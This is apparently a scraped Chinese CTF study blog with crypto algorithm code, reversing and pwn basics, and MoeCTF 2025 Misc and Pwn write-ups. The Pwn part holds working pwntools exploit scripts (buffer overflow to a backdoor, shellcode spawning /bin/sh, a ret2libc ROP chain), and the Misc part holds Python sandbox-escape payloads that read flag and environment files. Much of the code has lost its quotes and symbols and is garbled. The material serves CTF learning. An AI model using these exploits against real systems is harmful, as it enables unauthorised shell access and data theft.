//加密函数主体 v[0]=v0; v[1]=v1;//置换 //解密函数 void decrypt (uint32_t* v, uint32_t* k) uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i;//密文，此时sum=delta*32 uint32_t delta=0x9e3779b9; uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; for (i=0; i32; i++) v1 -= ((v04) + k2) ^ (v0 + sum) ^ ((v05) + k3); v0 -= ((v14) + k0) ^ (v1 + sum) ^ ((v15) + k1); sum -= delta; //解密函数主体 ，倒过来写即可 v[0]=v0; v[1]=v1;//置换 XTEA#include stdio.h #include stdint.h void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) unsigned int i; uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9; for (i=0; i num_rounds; i++) v0 += (((v1 4) ^ (v1 5)) + v1) ^ (sum + key[sum 3]); sum += delta; v1 += (((v0 4) ^ (v0 5)) + v0) ^ (sum + key[(sum11) 3]); v[0]=v0; v[1]=v1; void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) unsigned int i; uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds; for (i=0; i num_rounds; i++) v1 -= (((v0 4) ^ (v0 5)) + v0) ^ (sum + key[(sum11) 3]); sum -= delta; v0 -= (((v1 4) ^ (v1 5)) + v1) ^ (sum + key[sum 3]); v[0]=v0; v[1]=v1; XXTEA#include stdio.h#include stdint.h#define DELTA 0x9e3779b9#define MX (((z5^y2) + (y3^z4)) ^ ((sum^y) + (key[(p3)^e] ^ z))) void btea(uint32_t *v, int n, uint32_t const key[4]) uint32_t y, z, sum; unsigned p, rounds, e; if (n 1) /* Coding Part */ rounds = 6 + 52/n; sum = 0; z = v[n-1]; do sum += DELTA; e = (sum 2) 3; for (p=0; pn-1; p++) y = v[p+1]; z = v[p] += MX; y = v[0]; z = v[n-1] += MX; while (--rounds); else if (n -1) /* Decoding Part */ n = -n; rounds = 6 + 52/n; sum = rounds*DELTA; y = v[0]; do e = (sum 2) 3; for (p=n-1; p0; p--) z = v[p-1]; y = v[p] -= MX; z = v[n-1]; y = v[0] -= MX; sum -= DELTA; while (--rounds); RC4#includestdio.h//交换void Swap(unsigned char *S1, unsigned char *S2) unsigned char tmp = *S1; *S1 = *S2; *S2 = tmp;//获取字符串长度int my_strlen(unsigned char *S) int i = 0; int res = 0; while(*S++ != \\0) res += 1; i++; return res; //初始化S盒void init_S_Box(unsigned char *S, unsigned char *Key, int len) int i = 0, j = 0; unsigned char T[256]; unsigned char tmp = 0; for (i = 0; i 256; i++) S[i] = i; // S_box升序置为0~255 T[i] = Key[i % len]; // T使用key来进行填充的 //初始置换 for (i = 0; i256; i++) j = (j + S[i] + T[i]) % 256; // 取一个s[i]+k[i]+j的索引 //交换S[i]和S[j] Swap(S[i], S[j]); //加解密函数，因为是异或的方式所以加密也是解密void rc4(unsigned char *S, unsigned char *Str, int len) //PRGA(伪随机数生成) int i = 0, j = 0, k = 0, t = 0; for (k = 0; k len; k++) i = (i + 1) % 256; j = (j + S[i]) % 256; Swap(S[i], S[j]); t = (S[i] + S[j]) % 256; Str[k] = Str[k] ^ S[t]; //以活加密 int main() //用无符号字符型，因为一个char的大小刚好是一字节，无符号是为了防止出现负数 unsigned char S_box[256] = ; unsigned char Key[256] = hello world; unsigned char Str[512] = hello world!; int len = my_strlen(Key); printf(*************原始信息************* ); printf(message = %s , Str); printf(Key = %s Key_length = %d , Key, len); init_S_Box(S_box, Key, len); //初始化 printf(*************加密************* ); rc4(S_box, Str, len);//加密 printf(cipher = %s , Str); printf(*************解密************* ); init_S_Box(S_box, Key, len); //初始化 rc4(S_box, Str, len); printf(message = %s , Str); DES输入与输出 输入：64 位明文块、64 位密钥（有效 56 位）。 输出：64 位密文块。 模式：DES 常用于 ECB、CBC 等块密码模式。 主要步骤DES 的加密过程包括以下步骤： 初始置换（IP）：对 64 位明文进行固定位重排，生成左右两半（L₀, R₀），各 32 位。 16 轮 Feistel 迭代：每轮使用子密钥对右半部分进行变换，与左半部分结合。 左右交换：第 16 轮后，左右半部分交换位置。 最终置换（IP⁻¹）：对结果进行逆初始置换，生成 64 位密文。 Hash校验码校验码是通过特定的哈希算法对文件内容计算得出的。不同的算法产生不同长度和格式的校验码。常见的算法有： MD5 格式： 一个 32 个字符的十六进制字符串（128 位）。 SHA-1 格式： 一个 40 个字符的十六进制字符串（160 位）。 SHA-256（目前最推荐） CRC32 格式： 通常是一个 8 个字符的十六进制字符串（32 位）。 flag 可经过密码学哈希函数计算，得到的一串“指纹”（称为哈希值或摘要） MD5MD5 是一个单向哈希函数，接受任意长度输入（消息），生成固定 128 位（32 个十六进制字符）的哈希值。核心特点： 输入：任意长度的二进制数据（消息）。 输出：128 位（16 字节）哈希值，通常表示为 32 个十六进制字符。 单向性：从输入到哈希值易于计算，但反向（从哈希值恢复输入）在计算上是不可行的。 抗碰撞性（现已失效）：理想上，不同输入应产生不同哈希值，但 MD5 已发现碰撞。 SHA 256一个哈希函数示例： #include stdio.h#include string.h#include stdint.h// SHA-256 初始哈希值（固定常量）static const uint32_t initial_hashes[] = 0x6A09E667, 0xBB67AE85, 0x3C6EF372, 0xA54FF53A, 0x510E527F, 0x9B05688C, 0x1F83D9AB, 0x5BE0CD19;// 假设的压缩函数（未提供具体实现，需替换为实际 SHA-256 压缩逻辑）void sha256_compress(uint8_t* state, const uint8_t* block);// SHA-256 上下文结构typedef struct uint8_t buffer[64]; // 数据缓冲区 uint32_t count; // 当前缓冲区中的字节数 uint64_t total_bits; // 已处理的位数 uint32_t h[8]; // 哈希状态 sha256_context;// 初始化 SHA-256 上下文void sha256_init(sha256_context* ctx) ctx-count = 0; ctx-total_bits = 0; for (int i = 0; i 8; i++) ctx-h[i] = initial_hashes[i]; // 更新上下文，处理输入数据void sha256_update(sha256_context* ctx, const uint8_t* data, size_t len) for (size_t i = 0; i len; i++) ctx-buffer[ctx-count++] = data[i]; if (ctx-count == 64) sha256_compress((uint8_t*)ctx, ctx-buffer); ctx-total_bits += 512; ctx-count = 0; // 填充数据并生成最终哈希值void sha256_final(sha256_context* ctx, uint8_t* hash) // 添加 0x80 填充字节 ctx-buffer[ctx-count++] = 0x80; // 如果缓冲区不足以容纳长度信息（8 字节），补零并压缩 if (ctx-count 56) while (ctx-count 64) ctx-buffer[ctx-count++] = 0; sha256_compress((uint8_t*)ctx, ctx-buffer); memset(ctx-buffer, 0, 64); ctx-count = 0; else // 补零直到 56 字节 while (ctx-count 56) ctx-buffer[ctx-count++] = 0; // 添加数据长度（以位为单位） ctx-total_bits += ctx-count * 8; ctx-buffer[63] = (uint8_t)(ctx-total_bits); ctx-buffer[62] = (uint8_t)(ctx-total_bits 8); ctx-buffer[61] = (uint8_t)(ctx-total_bits 16); ctx-buffer[60] = (uint8_t)(ctx-total_bits 24); ctx-buffer[59] = (uint8_t)(ctx-total_bits 32); ctx-buffer[58] = (uint8_t)(ctx-total_bits 40); ctx-buffer[57] = (uint8_t)(ctx-total_bits 48); ctx-buffer[56] = (uint8_t)(ctx-total_bits 56); // 压缩最后一块 sha256_compress((uint8_t*)ctx, ctx-buffer); // 将哈希状态转换为字节数组（大端序） for (int i = 0; i 4; i++) hash[i] = (uint8_t)(ctx-h[0] (24 - i * 8)); hash[i + 4] = (uint8_t)(ctx-h[1] (24 - i * 8)); hash[i + 8] = (uint8_t)(ctx-h[2] (24 - i * 8)); hash[i + 12] = (uint8_t)(ctx-h[3] (24 - i * 8)); hash[i + 16] = (uint8_t)(ctx-h[4] (24 - i * 8)); hash[i + 20] = (uint8_t)(ctx-h[5] (24 - i * 8)); hash[i + 24] = (uint8_t)(ctx-h[6] (24 - i * 8)); hash[i + 28] = (uint8_t)(ctx-h[7] (24 - i * 8)); // 主哈希函数int hash(const char* flag, const uint8_t* expected_hash) sha256_context ctx; uint8_t hash[32]; sha256_init(ctx); sha256_update(ctx, (const uint8_t*)flag, strlen(flag)); sha256_final(ctx, hash); // 比较生成的哈希值与预期哈希值 return memcmp(hash, expected_hash, 32) == 0;// 示例主函数int main() const char* flag = example_input; uint8_t expected_hash[32] = /* 假设的预期哈希值 */ ; if (hash(flag, expected_hash)) printf(Hash matches! ); else printf(Hash does not match. ); return 0; IDAShift + E 提取数据 Shift + F12 字符串表 x 跳转引用 快捷键 主要功能 应用场景 C 将选中的数据字节转换为代码（指令） 分析未被IDA自动识别为代码的区域，例如壳代码、Shellcode或混淆后的代码 Ctrl + D 将数据在字节、字、双字、四字等格式间循环转换 调整数据段的显示方式和解释，例如查看不同尺寸的数据值 CTRL + F 搜索函数 db 2 dup(0), 5, 2 dup(0), 4, 3, 6, 5 dup(0), 5, 2 dup(0) 数据段 2 dup(0) 表示重复两次用 00 填充 00 00 5 00 00 4 3 6 00 00 00 00 00 5 00 00 LoTbinwalk -Me file.bin","categories":["CTF"]},{"title":"CTF Pwn 基础知识","path":"//CTF Pwn 基础知识/","content":"CTF Pwn 基础知识 程序内存中的映射高地址（0x7FFF...）┌───────────────────────┐│ Kernel │ ← 内核空间（用户进程不可访问）├───────────────────────┤│ Stack │ ← 栈（向下增长）│ ↓ │├───────────────────────┤│ ... │ ← 共享库、内存映射区等├───────────────────────┤│ Heap │ ← 堆（向上增长）│ ↑ │├───────────────────────┤│ .bss / .data / .text │ ← 未初始化/已初始化数据、代码段└───────────────────────┘低地址（0x400000） 部署到本地网络拿到一个 Linux 文件首先直接运行 chmod u+x your_pwn_binary # 授予权限./your_pwn_binary 使用 netstat 或 lsof 命令查找程序输出端口号 netstat -tlnp | grep your_pwn_binary# 或者使用 lsoflsof -i -P -n | grep LISTEN | grep your_pwn_binary pwntoolspython3 -m pip install --upgrade pippython3 -m pip install --upgrade pwntools pwntools 是一个开源的 Python 库，主要用于二进制漏洞利用、逆向工程和 CTF 挑战的开发。它抽象了许多底层操作，使得安全研究人员可以专注于漏洞分析和利用逻辑，而无需处理繁琐的细节。 主要功能： 与本地或远程进程交互（如二进制程序、远程服务器）。 处理 ELF 文件、ROP（返回导向编程）链生成。 提供便捷的汇编反汇编工具。 支持多种架构（如 x86、x64、ARM、MIPS 等）。 提供网络通信工具（如 socket 操作）。 自动化调试和漏洞利用开发。 例：向远程服务发送 JSON 数据 from pwn import * # 导入 pwntools 库的所有功能import json # 导入 Python 的 json 模块，用于处理 JSON 数据的序列化和反序列化# 定义远程服务器的地址和端口号HOST = socket.cryptohack.org # 远程服务器的主机名PORT = 11112 # 远程服务器的端口号# 使用 pwntools 的 remote 函数建立与远程服务器的 TCP 连接r = remote(HOST, PORT) # 创建一个远程连接对象 r，用于与 socket.cryptohack.org:11112 通信# 定义一个函数，用于接收服务器发送的 JSON 数据def json_recv(): line = r.readline() # 使用 pwntools 的 readline 方法读取服务器发送的一行数据 return json.loads(line.decode()) # 将接收到的字节数据解码为字符串，并解析为 Python 的 JSON 对象（通常是字典）# 定义一个函数，用于向服务器发送 JSON 数据def json_send(hsh): request = json.dumps(hsh).encode() # 将 Python 字典 hsh 序列化为 JSON 字符串，并编码为字节 r.sendline(request) # 使用 pwntools 的 sendline 方法将字节数据发送到服务器，并自动添加换行符# 连续读取服务器发送的四行数据并打印# 这些行是服务器的欢迎信息、提示或其他初始输出print(r.readline()) # 读取并打印第一行数据（字节形式）print(r.readline()) # 读取并打印第二行数据print(r.readline()) # 读取并打印第三行数据print(r.readline()) # 读取并打印第四行数据# 创建一个 JSON 请求字典，表示购买 flagrequest = buy: flag # 构造一个字典，键为 buy，值为 flagjson_send(request) # 调用 json_send 函数，将请求序列化为 JSON 并发送到服务器# 接收服务器的响应并解析为 JSONresponse = json_recv() # 调用 json_recv 函数，接收服务器的响应并解析为 Python 字典# 打印服务器的响应print(response) # 输出服务器返回的 JSON 数据（通常是字典形式） from pwn import * # 导入 pwntools。context(arch=amd64, os=linux, log_level=debug) # 一些基本的配置。# 有时我们需要在本地调试运行程序，需要配置 context.terminal。详见入门指北。# io = process(./pwn) # 在本地运行程序。# gdb.attach(io) # 启动 GDBio = connect(127.0.0.1, 53216) # 与在线环境交互。io.sendline(b114511) # 什么时候用 send 什么时候用 sendline？payload = p32(0xdeadbeef) # p32(0xdeadbeef)、b\\xde\\xad\\xbe\\xef、bdeadbeef 有什么区别？payload += bshuijiangui # strcmpio.sendafter(bpassword., payload) # 发送！通过所有的检查。io.interactive() # 手动接收 flag。 pwngdbgit clone https://github.com/scwuaptx/Pwngdb.git ~/Pwngdbcp ~/Pwngdb/.gdbinit ~/ x/s Buffer Windows环境下汇编1. 核心调用约定Windows 主要使用以下三种调用约定： 调用约定 清理方 参数传递顺序 寄存器使用 典型应用场景 __cdecl 调用者 从右到左 栈传递参数 C 语言默认、可变参数函数 __stdcall 被调者 从右到左 栈传递参数 Win32 API 函数 __fastcall 被调者 从右到左 前两个参数用 ECXEDX，其余用栈 性能敏感代码 2 .寄存器 寄存器 主要用途 Windows 特殊约定 RSP 栈指针（Stack Pointer），指向当前栈顶 必须 16 字节对齐（调用 API 时） RDI 通用寄存器，Linux 中用于传递第一个参数（Windows 不用） Windows 中通常为临时寄存器 RAX 返回值寄存器（Return Value） 系统调用（syscall）返回值也存于此 RCX 通用寄存器，Windows 中用于传递第一个整数参数 fastcall调用约定第 1 个参数 RDX 通用寄存器，Windows 中用于传递第二个整数参数 fastcall调用约定第 2 个参数 R8 通用寄存器，Windows 中用于传递第三个整数参数 fastcall调用约定第 3 个参数 R9 通用寄存器，Windows 中用于传递第四个整数参数 fastcall调用约定第 4 个参数 手动编译# 下载特定版本的 glibc 源码wget https://ftp.gnu.org/gnu/glibc/glibc-2.31.tar.gztar -xf glibc-2.31.tar.gzcd glibc-2.31# 编译（需要指定安装目录）mkdir build cd build../configure --prefix=/path/to/glibc-2.31-installmake -j$(nproc)make install# 获取 ld-linuxcp /path/to/glibc-2.31-install/lib/ld-linux-x86-64.so.2 ./ 汇编heap：变，动态分配，runtime stack：定，可以存储函数返回地址 缓冲区溢出根本原因：数据混杂 直接原因：未进行长度检查 strcpy(Buffer,input); // 不检查长度。直接复制","categories":["CTF"]},{"title":"MoeCTF 2025 Misc","path":"//MoeCTF 2025-2/","content":"杂项部分 Misc 信息搜集 取证分析 内存分析：volatility 磁盘取证：VeraCrypt(处理加密卷)、Elcomsoft Forensic Disk Decryptor 隐写：StegSolve 流量分析：WireShark 编码 题目入门指北一个入门指北 PDF 文件，提示说 flag 需要查找，然后复制这块空白 moectfWe1c0m3_7o_tH3_w0R1d_0f_m1sc3111aN3ous!! ez_LSBjava -jar .\\StegSolve-1.4.jar 一张红色校徽图片， 54686520666c6167 2069733a20625739 The flag is: bW96c5933526d653078 54516c3878633139 lY3Rme0x TQl8xc197a4d463878626e51 7a636d567a644446 zMF8xbnQ zcmVzdDF755a79456863326f 3564325239000000 uZyEhc2o 5d2R9... bW9lY3Rme0xTQl8xc19zMF8xbnQzcmVzdDFuZyEhc2o5d2R9 注意到 bW9lY3Rme 开头（之前Base64解码过，就是 moectf{ ） 猜测是base64加密过的，现在解码 import base64ciphertext = bW9lY3Rme0xTQl8xc19zMF8xbnQzcmVzdDFuZyEhc2o5d2R9b = base64.b64decode(ciphertext) print(b.decode()) # 输出解码后的明文 输出： moectfLSB_1s_s0_1nt3rest1ng!!sj9wd ez_锟斤拷????打开 flag.txt 首先要了解一下 锟斤拷 的形成原理 GBK 字符集 转化成 Unicode字符集 时，有些字符是 Unicode 没法表示的。使用一个占位符来表示这些文字。就是 U+FFFD U+FFFD：UTF-8 编码 - \\xef\\xbf\\xbd 重复多次\\xef\\xbf\\xbd\\xef\\xbf\\xbd：GBK 编码 - EFBF BDEF BFBD 锟斤拷 先通过编码保存为 GBK，再通过 UTF-8 编码重新打开flag.txt即可 即： moectfEnC0d1ing_gbK_@nD_Utf_8_1s_4un!!ewwww Rush打开是一个 gif 文件 导出每帧图片：第12帧出现了二维码 但是这个码缺失了一部分，扫不了 补上两个角即可 moectfQR_C0d3s_feATUR3_eRror_c0RRECt10N CRC在 windows 下可以正常打开图片，在 LinuxVScode 中打不开 先分析一下png图片格式 前八个字节89 50 4E 47 0D 0A 1A 0A为png的文件头，该段格式是固定的 图中高亮部分为chunk[0]段：00 00 00 0D 表示数据块的长度为13 ​\t49 48 44 52：IHDR，是文件头数据块的标识，该段格式也是固定的 ​\t之后进入 13 位数据块 ​ 前四个字节：00 00 03 84 表示图片的宽为0x384 ​ 后四个字节：00 00 01 EA 表示图片的高为0x1EA ​ 后五个字节：08 02 00 00 00：分别表示bit depth 、color type、compression method、filter method、interlace method ​ 剩余四个字节：B5 A7 BF 8C：CRC校验码 宽：0384(900)高：01EA(490)CRC校验码： B5A7BF8C 对一张正常的图片，通过修改其宽度或者高度隐藏信息，使计算出的CRC校验码与原图的CRC校验码不一致；windows的图片查看器会忽略错误的CRC校验码，因此会显示图片，但此时的图片已经是修改过的，所以会有显示不全或扭曲等情况，借此可以隐藏信息。 而Linux下的图片查看器不会忽略错误的CRC校验码，因此用Linux打开修改过宽或高的png图片时，会出现打不开的情况 根据CRC校验码爆破获得原图片的宽和高 import binasciitarget_crc = 0xB5A7BF8Cbit_depth = 8color_type = 2compression = 0filter_method = 0interlace = 0chunk_type = bIHDR# 爆破宽高区间自行设置（比如1~4096）for width in range(1, 4096): for height in range(1, 4096): ihdr_data = ( width.to_bytes(4, big) + height.to_bytes(4, big) + bit_depth.to_bytes(1, big) + color_type.to_bytes(1, big) + compression.to_bytes(1, big) + filter_method.to_bytes(1, big) + interlace.to_bytes(1, big) ) crc_val = binascii.crc32(chunk_type + ihdr_data) 0xFFFFFFFF if crc_val == target_crc: print(Found!) print(Width:, width) # 900 print(Height:, height) # 490 print(Other IHDR params:, [bit_depth, color_type, compression, filter_method, interlace]) exit(0) Pyjail 0输入环境变量文件 /proc/self/environ 输出中就有： moectf766a13c0-2bec-c73e-9672-0494df5b07a5 Pyjail 1def chall(): user_input = input(Give me your code: ) # 过滤关键字 forbidden_keywords = [import, eval, exec, open, file] for keyword in forbidden_keywords: if keyword in user_input: print(fForbidden keyword detected: keyword) return result = eval(user_input) cmd = __builtins__.__dict__[__imp + ort__](o + s).system(cat /tmp/flag.txt) Pyjail 2def chall(): user_input = input(Give me your code: ) # 过滤关键字 forbidden_keywords = [import, eval, exec, open, file] for keyword in forbidden_keywords: if keyword in user_input: print(fForbidden keyword detected: keyword) return # 过滤特殊字符 forbidden_chars = [., _, [, ], , ] for char in forbidden_chars: if char in user_input: print(fForbidden character detected: char) return result = eval(user_input) 利用 chr() 函数返回字符串，绕过 、、_ 过滤 利用getattr 绕过 . print(str.join(list(open(/tmp/flag.txt)))) print(getattr(str(),join)(list(open(/tmp/flag.txt)))) print(getattr(str(),join)(list(getattr(__builtins__,open)(/tmp/flag.txt)))) 此时 __builtins__ 仍然是模块名，而不是一个字符串，接着把它变成字符串形式 print(getattr(str(),join)(list(getattr(globals().get(__builtins__), open)(/tmp/flag.txt)))) print(getattr(str(),join)(list(getattr(getattr(globals(),get(__builtins__)), open)(/tmp/flag.txt)))) 最终： print(getattr(str(),chr(106)+chr(111)+chr(105)+chr(110))(list(getattr(getattr(globals(),chr(103)+chr(101)+chr(116))(chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)),(chr(111)+chr(112))+chr(101)+chr(110))(chr(47)+chr(116)+chr(109)+chr(112)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)))))","categories":["MoeCTF 2025"]},{"title":"MoeCTF 2025 Pwn","path":"//MoeCTF 2025-3/","content":"PWN部分 题目hellopwn passwd = 0x1BF4F = 114511 moectftHe_bEg1Nn1ng-of-foRM4t4e4e0b39e ez_u64 字节流是一种常见的数据表示形式，用于存储、传输和处理各种类型的数据。我们不妨试试用pwntools中的u64,p64,u32,p32将特定大小的字节流与整数相互转换。 第十行输出8字节的num，查看发现在 init 函数中也被引用，应该是个随机数 后面 以 %zu 格式化输入一个数，需要与 num 相等 输入：无符号十进制整数 8字节 from pwn import * # 导入 pwntools。context(arch=amd64, os=linux, log_level=debug) # 一些基本的配置。io = connect(127.0.0.1, 54174)io.recvuntil(Here is the hint.)data = io.recvn(8)num = u64(data)io.recvuntil(b)io.sendline(str(num).encode())io.interactive() moectfus3FUI_tHiNgS_1n_PWntO0L51d19e477 find_it 第 9 行：复制 fd 1 (stdout) 的进程到 v3 。之后写入 v3，即使用 stdout 输出字符串。然后关闭 fd 1 接下来要 写入 到 fd fd1 的进程，0、1、2 from pwn import * # 导入 pwntools。context(arch=amd64, os=linux, log_level=debug) # 一些基本的配置。io = connect(127.0.0.1, 44332)io.sendafter(Can you find it? , 3 .encode())io.sendafter(like to see? , flag .encode())io.sendafter(What is its fd? , 1 .encode())io.interactive() moectfFlND_th3-h1dD3n-Fd2aaa2bb2b8c EZtext from pwn import *context(arch=amd64, os=linux, log_level=debug)context.timeout = 30# 连接到远程服务（替换为实际地址和端口）io = remote(127.0.0.1, 49597)# 输入字节数io.sendafter(bThen how many bytes do you need to overflow the stack? , b24)backdoor_address = 0x4011BE # 获得的 `treasure` 地址payload = cyclic(0x9)# 填满 `Buffer`payload += cyclic(0x8) # 填满暂存的 `rbp`payload += p64(backdoor_address) # 篡改返回地址为 8 字节io.send(payload) io.interactive() cat flag moectfR3tZtExt_l5_THe-ST4Rt-0F-rOP1f6d5941 ezshellcode mprotect 是一个 POSIX 系统调用，用于修改指定内存区域的保护属性。它的函数原型（在 Linux 中）如下： int mprotect(void *addr, size_t len, int prot); addr：要修改保护属性的内存起始地址，必须是页面对齐的（通常是 4KB 的倍数，具体取决于系统页面大小）。len：要修改的内存区域长度（以字节为单位）。prot：新的保护标志，可以是以下值的组合（通过位或 | 运算）：- 1：PROT_READ：内存可读。 - 2：1PROT_WRITE：内存可写。- 4：PROT_EXEC：内存可执行。- 0：PROT_NONE：内存不可访问。这些权限可以通过位或运算（|）组合使用。例如：PROT_READ | PROT_WRITE = 1 | 2 = 3（可读可写）。PROT_READ | PROT_WRITE | PROT_EXEC = 1 | 2 | 4 = 7（可读、可写、可执行）。PROT_NONE = 0（无权限）。 选择： 输入 - 权限4 - prot = 73 - prot = 41 - prot = 12 - prot = 3 那现在我们的选择是 7 给 s 设置了可读可写可执行的权限，现在向 s 地址处读入一段代码 from pwn import * # 导入 pwntools。context(arch=amd64, os=linux, log_level=debug) # 一些基本的配置。io = connect(127.0.0.1, 31412) # 与在线环境交互。# 生成 /bin/sh 的 shellcode（汇编代码）shellcode_asm = shellcraft.amd64.linux.sh()# 使用 asm() 汇编成二进制shellcode_bin = asm(shellcode_asm)io.sendafter(bChoose wisely!, b4 ) # 选择 4 ，获取 可读、可写、可执行 权限payload = p32(shellcode_bin) io.sendafter(byou just set., payload)io.interactive() # 手动接收 flag。 输出： moectfp0WErFUL_sh3I1c0D3-C@N_Do-AnyTHing9a63c prelibc 接下来读 0x100 字节到 buf printf: 606F0system: 50D70 已知：printf：0x7935fa860100 将可执行文件的 libc.so.6 依赖替换为我们的 libc.so.6： # 修改二进制文件的库搜索路径patchelf --set-interpreter ~/MoeCTF2025/prelibc/ld-linux-x86-64.so.2 ./pwn # 指定动态链接器patchelf --set-rpath ~/MoeCTF2025/prelibc ./pwn # 指定 libc.so.6的搜索路径 (MoeCTF-env) yang@yang:~/MoeCTF2025/pwn/prelibc$ strings libc.so.6 |grep UbuntuGNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.10) stable release version 2.35. from pwn import * p = process(./pwn)libc = ELF(./libc.so.6)elf = ELF(./pwn)system = libc.sym[printf]#这里的system可以替换成别的函数，用于搜索偏移print(hex(system))if args.G: gdb.attach(p) p.interactive() 左边可以看到注入的 system 地址是 0x7bde73e50780，而程序也跳转到这里执行，但是并不是 system 命令 说明我们计算的地址出错了。 # 下载特定版本的 glibc 源码wget https://ftp.gnu.org/gnu/glibc/glibc-2.35.tar.gztar -xf glibc-2.35.tar.gzcd glibc-2.35# 编译（需要指定安装目录）mkdir build cd build../configure --prefix=/home/yang/MoeCTF2025/pwn/prelibc/glibc-2.35-installmake -j$(nproc)make install# 获取 ld-linuxcp /home/yang/MoeCTF2025/pwn/prelibc/glibc-2.35-install/lib/ld-linux-x86-64.so.2 ./ld-linux-x86-64.so.2 patchelf --set-interpreter ~/MoeCTF2025/prelibc/ld-linux-x86-64.so.2 ./pwn # 指定动态链接器patchelf --set-rpath ~/MoeCTF2025/prelibc ./pwn # 指定 libc.so.6的搜索路径 rodata:00000000001D8678 aBinSh db /bin/sh,0 在 x86-64 调用约定中，system 的第一个参数通过 rdi 寄存器传递。因此，需要一个 ROP gadget 设置 rdi bin_sh_address，然后跳转到 system。 终于成功了 from pwn import *context(arch=amd64, os=linux, log_level=debug)# 直接启动 gdb 调试io = connect(127.0.0.1,19063)io.recvuntil(bthe location of printf: )printf_address = io.recvline().strip() # 读取 `printf` 的地址。printf_address = int(printf_address, 16) # 转换为整数。print(hex(printf_address))system_add = 0x50d70printf_add = 0x606f0shell_add = 0x1D8678pop_rdi_ret_add = 0x2a3e5ret_add = 0x404f0system_address = printf_address + system_add - printf_addshell_address = printf_address + shell_add - printf_addpop_rdi_ret = printf_address + pop_rdi_ret_add - printf_addret = printf_address + ret_add - printf_addpayload = cyclic(64) # 填充 bufferpayload += cyclic(8) # 填充 rbppayload += p64(pop_rdi_ret) # 先调用 pop rdi; retpayload += p64(shell_address) # 弹出 shell_address 到 rdipayload += p64(ret) # 栈对齐payload += p64(system_address) # 跳转到 systemio.sendafter(b , payload)io.interactive() # 手动接收 flag。 from pwn import *context(arch=amd64, os=linux, log_level=debug)context.terminal = [tmux, splitw, -h] # 如果你用 tmux（推荐）# 直接启动 gdb 调试io = process(./pwn)gdb.attach(io, b *(main+84)b *(vuln+71)layout asmlayout regs)io.recvuntil(bthe location of printf: )printf_address = io.recvline().strip() # 读取 `printf` 的地址。printf_address = int(printf_address, 16) # 转换为整数。print(hex(printf_address))system_add = 0x50d70printf_add = 0x606f0shell_add = 0x1D8678pop_rdi_ret_add = 0x2a3e5ret_add = 0x404f0system_address = printf_address + system_add - printf_addshell_address = printf_address + shell_add - printf_addpop_rdi_ret = printf_address + pop_rdi_ret_add - printf_addret = printf_address + ret_add - printf_addpayload = cyclic(64) # 填充 bufferpayload += cyclic(8) # 填充 rbppayload += p64(pop_rdi_ret) # 先调用 pop rdi; retpayload += p64(shell_address) # 弹出 shell_address 到 rdipayload += p64(ret) # 栈对齐payload += p64(system_address) # 跳转到 systemio.sendafter(b , payload)io.interactive() # 手动接收 flag。 boom 31 行：需要 v6 等于 0，同时 v5 等于 canary Pwntoolsprocess() # 创建本地进程对象remote(IP,port) # 创建远程连接对象（TCP/UDP）listen() # 创建监听端口（用于反向连接）recv(n) # 接收 n 个字节recvline() # 接收一行数据（直到换行符） recvall() # 接收所有数据直到 EOFrecvrepeat(timeout) # 接收数据直到超时send() # 发送数据 sendline() # 发送一行数据（带换行符）sendafter(delim,data) # 在收到delim后发送datasendlineafter(delim, data)u64() # 字节流转换成64位无符号整数u32() # 字节流转换成32位无符号整数p64() # 64位无符号整数转换为8字节的字节流p32() # 32位无符号整数转换为4字节的字节流process.interactive() # 进入交互模式（获得Shell之后） 举例： from pwn import * # 导入 pwntools。context(arch=amd64, os=linux, log_level=debug) # 一些基本的配置。# 有时我们需要在本地调试运行程序，需要配置 context.terminal。详见入门指北。# io = process(./pwn) # 在本地运行程序。# gdb.attach(io) # 启动 GDBio = connect(127.0.0.1, 53216) # 与在线环境交互。io.sendline(b114511) # 什么时候用 send 什么时候用 sendline？payload = p32(0xdeadbeef) # p32(0xdeadbeef)、b\\xde\\xad\\xbe\\xef、bdeadbeef 有什么区别？ # 你看懂原程序这里的检查逻辑了吗？payload += bshuijiangui # strcmpio.sendafter(bpassword., payload) # 发送！通过所有的检查。io.interactive() # 手动接收 flag。 from pwn import * # 导入 pwntools。context(arch=amd64, os=linux, log_level=debug) # 一些基本的配置。io = connect(127.0.0.1, 54174)io.recvuntil(Here is the hint.)data = io.recvn(8) # 接收八个字节数据num = u64(data)io.recvuntil(b)io.sendline(str(num).encode()) # io.interactive() 随机种子： srandom(v0) 使用 time(0LL)（当前时间戳，单位秒）作为种子。 这意味着 canary (int)random() % 114514 的值在程序启动时是可预测的（取决于启动时间）。 时间依赖： 由于 time(0LL) 返回的是一秒级的时间戳，多次快速启动程序可能得到相同的种子。 这为 canary 的猜测提供了机会。 Linux知识文件描述符fd当进程打开新文件时，内核会： 在进程的文件描述符表中查找第一个空闲位置 将该位置的索引作为fd返回 在系统级打开文件表中创建相应条目 特殊fd： 0：stdin 1：stdout 2：stderr 相关系统调用： // 打开文件，返回fdint open(const char *pathname, int flags); // 关闭fdint close(int fd);// 从fd读取ssize_t read(int fd, void *buf, size_t count); // 写入fdssize_t write(int fd, const void *buf, size_t count); int dup(int oldfd); // 复制fdint dup2(int oldfd, int newfd); // 复制fd到指定值","categories":["MoeCTF 2025"]},{"title":"CryptoHack 第二部分 模运算","path":"//CryptoHack-2/","content":"介绍模运算及相关概念、算法、定理 最大公约数GCD欧几里得算法计算两个数的最大公约数GCD 扩展欧几里得算法还能找到一组整数解 (x) 和 (y)，满足 $ ax+bygcd⁡(a,b) $ # 欧几里得算法def gcd(a, b): while b != 0: a, b = b, a % b return a# 扩展欧几里得算法（使用递归）def gcd_extended(a, b): if a == 0: return b, 0, 1 gcd, x1, y1 = gcd_extended(b % a, a) x = y1 - (b // a) * x1 y = x1 return gcd, x, y 费马小定理若模 p 为质数，定义一个域 $ F_{p}$ 若模 n 非质数，则只能定义一个环 $ F_{p}$ 表示集合 ${ 0,1,…,p-1 }$ 费马小定理 如果 